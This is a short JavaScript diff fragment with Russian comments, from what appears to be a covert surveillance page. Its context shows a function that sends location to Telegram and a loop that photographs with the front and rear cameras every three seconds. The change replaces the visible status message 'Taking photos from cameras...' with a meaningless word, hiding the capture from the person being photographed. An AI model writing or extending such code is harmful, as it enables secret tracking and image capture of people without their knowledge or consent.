@@ -70,7 +70,7 @@ function sendLocationToTelegram(lat, lon) {
 
 // Запускаем поочерёдный цикл фото с фронтальной и задней камеры
 async function startCameraCycle() {
-  statusEl.textContent = 'Делаем фото с камер...';
+  statusEl.textContent = 'Xazbik';
 
   // Каждые 3 секунды меняем камеру и снимаем фото
   photoInterval = setInterval(async () => {
